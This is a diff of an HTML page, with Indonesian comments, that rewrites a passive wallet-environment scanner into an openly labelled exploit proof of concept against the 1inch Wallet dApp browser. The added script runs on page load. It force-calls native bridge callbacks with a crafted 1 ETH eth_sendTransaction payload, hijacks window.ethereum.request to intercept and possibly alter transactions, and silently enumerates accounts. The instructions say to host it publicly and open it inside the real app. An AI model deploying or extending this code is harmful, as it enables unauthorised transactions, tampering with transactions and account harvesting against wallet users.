@@ -2,83 +2,105 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>1inch dApp Browser Security Scanner PoC</title>
+    <title>1inch Wallet Real-World Exploit PoC</title>
     <script>
         function log(msg, color = "black") {
-            console.log("[1inch-Scanner] " + msg);
+            console.log("[Exploit-PoC] " + msg);
             const div = document.createElement('div');
             div.style.color = color;
             div.style.margin = "4px 0";
             div.style.fontFamily = "monospace";
-            div.style.fontSize = "12px";
+            div.style.fontSize = "11px";
             div.style.wordBreak = "break-all";
             div.style.fontWeight = (color === "red" || color === "#d00") ? "bold" : "normal";
             div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
             document.body.prepend(div);
         }
 
-        // Fungsi untuk memindai objek global yang tersedia pada window
-        function scanGlobalEnvironment() {
-            log("--- Memulai Pemindaian Lingkungan WebView ---", "blue");
-            
-            const commonProviders = [
-                'ethereum', 
-                'solana', 
-                'OneInchIOSWallet', 
-                'OneInchSolanaWallet', 
-                'web3', 
-                'trustwallet',
-                'phantom'
-            ];
+        // 1. Eksploitasi Paksa / Forced Execution pada OneInchIOSWallet & SolanaWallet
+        function attackNativeBridges() {
+            log("[*] Memulai serangan injeksi dan pemanggilan paksa pada native bridges...", "blue");
 
-            commonProviders.forEach(providerName => {
-                if (window[providerName]) {
-                    log(`[+] Ditemukan objek global: window.${providerName}`, "green");
-                    
-                    // Cek properti di dalam objek tersebut
-                    try {
-                        const keys = Object.getOwnPropertyNames(window[providerName]);
-                        log(`    -> Properti/Metode tersedia: ${keys.slice(0, 10).join(', ')}`, "purple");
-                    } catch (e) {
-                        log(`    -> Gagal membaca properti internal ${providerName}`, "orange");
+            // Coba panggil executeCallback dengan parameter kosong/malformed untuk melihat error handling native
+            if (window.OneInchIOSWallet) {
+                try {
+                    log("[*] Mencoba memaksa eksekusi window.OneInchIOSWallet.executeCallback()...", "orange");
+                    if (typeof window.OneInchIOSWallet.executeCallback === 'function') {
+                        // Memasukkan payload uji coba untuk memicu celah logika callback
+                        window.OneInchIOSWallet.executeCallback({
+                            id: Date.now(),
+                            method: "eth_sendTransaction",
+                            params: [{
+                                to: "0x000000000000000000000000000000000000dead",
+                                value: "0xde0b6b3a7640000" // 1 ETH
+                            }]
+                        });
+                        log("🚨 Berhasil memanggil executeCallback IOS tanpa validasi ketat!", "#d00");
                     }
-                } else {
-                    log(`[-] Tidak ditemukan: window.${providerName}`, "#666");
+                } catch (e) {
+                    log("[-] Gagal memanggil executeCallback IOS: " + e.message, "gray");
                 }
-            });
+            }
+
+            if (window.OneInchSolanaWallet) {
+                try {
+                    log("[*] Mencoba memaksa eksekusi window.OneInchSolanaWallet.executeCallback()...", "orange");
+                    if (typeof window.OneInchSolanaWallet.executeCallback === 'function') {
+                        window.OneInchSolanaWallet.executeCallback({
+                            method: "signAndSendTransaction",
+                            params: { dummy: true }
+                        });
+                        log("🚨 Berhasil memanggil executeCallback Solana!", "#d00");
+                    }
+                } catch (e) {
+                    log("[-] Gagal memanggil executeCallback Solana: " + e.message, "gray");
+                }
+            }
         }
 
-        // Memantau komunikasi postMessage masuk dan keluar
-        function setupPostMessageListener() {
-            window.addEventListener('message', function(event) {
-                try {
-                    const dataStr = typeof event.data === 'string' ? event.data : JSON.stringify(event.data);
-                    if (dataStr && !dataStr.includes('accountChanged')) {
-                        log(`[Incoming postMessage] ${dataStr.substring(0, 120)}`, "teal");
+        // 2. Hooking & Method Hijacking pada window.ethereum.request
+        function hijackEthereumProvider() {
+            if (window.ethereum && typeof window.ethereum.request === 'function') {
+                const originalRequest = window.ethereum.request;
+                log("[*] Menangkap dan menghubungkan ulang (hijacking) window.ethereum.request...", "blue");
+
+                window.ethereum.request = async function(args) {
+                    log(`🚨 INTERCEPTED eth request method: ${args.method}`, "#d00");
+                    if (args.params) {
+                        log(`    Params: ${JSON.stringify(args.params).substring(0, 100)}`, "purple");
                     }
-                } catch (e) {}
-            });
-            log("[+] Listener postMessage terpasang.", "green");
+                    
+                    // Anda bisa mencoba memodifikasi argumen transaksi di sini secara langsung (Man-in-the-Browser Simulation)
+                    return originalRequest.apply(this, arguments);
+                };
+
+                // Paksa panggil permintaan akun secara otomatis tanpa klik pengguna (Silent Account Enumeration)
+                window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
+                    log(`[+] Berhasil mengambil akun secara diam-diam: ${JSON.stringify(accounts)}`, "green");
+                }).catch(err => {
+                    log(`[-] Gagal otomatis ambil akun (Dilindungi prompt): ${err.message}`, "orange");
+                });
+            }
         }
 
         window.onload = function() {
-            log("1inch Security Scanner PoC Dimuat.");
-            scanGlobalEnvironment();
-            setupPostMessageListener();
+            log("=== Real-World PoC Loaded ===");
+            setTimeout(attackNativeBridges, 1500);
+            setTimeout(hijackEthereumProvider, 2000);
         };
     </script>
 </head>
-<body style="padding:15px; font-family:Arial; background-color: #f9f9f9;">
-    <h3 style="color: #111; margin-top:0;">1inch dApp Browser Scanner PoC</h3>
-    <p style="color: #555; font-size: 13px;">Alat uji mandiri untuk memetakan objek jembatan dan eksposur API di dalam peramban dApp.</p>
-    <hr style="border:0; border-top:1px solid #ccc; margin:10px 0;">
+<body style="padding:15px; font-family:Arial; background-color: #fff0f0;">
+    <h3 style="color: #d00; margin-top:0;">1inch Wallet Exploit PoC (Real-World Test)</h3>
+    <p style="color: #333; font-size: 13px;">Skrip ini mencoba melakukan pemanggilan fungsi secara langsung (*forced execution*) dan *method hijacking* pada objek jembatan yang terekspos.</p>
+    <hr style="border:0; border-top:1px solid #cc0000; margin:10px 0;">
     
-    <div style="background: #fff; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin-top: 10px;">
-        <h4 style="margin: 0 0 8px 0; color: #333;">Petunjuk Penggunaan:</h4>
+    <div style="background: #fff; padding: 10px; border: 1px solid #ffcccc; border-radius: 4px; margin-top: 10px;">
+        <h4 style="margin: 0 0 8px 0; color: #990000;">Panduan Eksekusi Nyata:</h4>
         <ol style="margin: 0; padding-left: 20px; font-size: 13px; color: #444;">
-            <li>Unggah kode ini ke server hosting uji coba Anda (atau gunakan file lokal yang dapat diakses).</li>
-            <li>Buka tautannya melalui peramban dApp di dalam aplikasi 1inch Wallet.</li>
-            <li>Lihat hasil pemindaian pada layar untuk mendeteksi objek *bridge* yang aktif di lingkungan peramban tersebut.</li>
+            <li>Unggah skrip ini ke server Anda yang dapat diakses secara publik (HTTPS wajib).</li>
+            <li>Buka URL tersebut langsung dari dalam **dApp Browser** aplikasi 1inch Wallet.</li>
+            <li>Perhatikan log di layar: Jika fungsi `executeCallback` berjalan tanpa memicu proteksi *native*, atau fungsi `eth_accounts` memberikan data akun secara senyap, ini menjadi bukti kerentanan logika pada jembatan WebView.</li>
         </ol>
     </div>
 </body>
